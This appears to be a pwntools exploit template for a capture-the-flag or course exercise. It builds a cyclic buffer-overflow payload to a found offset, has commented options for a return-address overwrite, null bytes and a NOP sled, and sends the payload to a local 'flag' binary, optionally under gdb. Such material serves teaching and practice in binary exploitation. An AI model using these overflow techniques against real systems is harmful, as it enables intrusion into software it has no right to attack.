#!/usr/bin/env python3
import sys
import os

from pwn import *

context.update(arch='x86_64', os='linux')
context.terminal = ["tmux","splitw"]    
#initialize payload
payload = ''

''' useful commands to construct payloads '''

''' create payload of 24 bytes of non-repeating, searchable 4-byte sequences '''
#payload  = cyclic( 1063)

''' create payload of X bytes, where X is number of bytes until reaching 0x61616164 '''
print(cyclic_find(0x6b616171))
payload  = cyclic(   cyclic_find( 0x6b616171  )  -1)
''' (alternate form using strings instead of hex/character code '''
#payload  = cyclic(   cyclic_find( 'daaa' )  )

''' append byte-formatted string for hex number 0xdeadbeef to payload '''
#payload += p64( 0x4019c1)

'''send a single null byte using python bytes() format '''
#payload = b'\x00'

''' create payload of 16 0x90 bytes '''
#payload = b'\x90'*16


'''don't change any of this, there is no reason to'''
os.system("./server &")
if (len(sys.argv)<= 1):
    p = process(os.getcwd() + "/flag")
elif (sys.argv[1] == "dbg"):
    p = gdb.debug([os.getcwd() + "/flag"],'''
    unset env LINES
    unset env COLUMNS
    break main
    continue
    ''')


''' potentially useful command for some tasks to get output of a binary process: '''

''' get a single line of output from process '''
#output = p.recv()

''' get all output from process (note: sometimes this hangs so not always best solution) '''
#output = p.recvall()

''' gets all text up until a certain string pattern, (NOTE: this will hang if the string is never seen by the process '''
#output = p.recvuntil('some useful text')


''' send payload in one line '''
p.sendline(payload)

''' If you want to iterate over multiple binary calls, then comment out line below: '''
p.interactive()
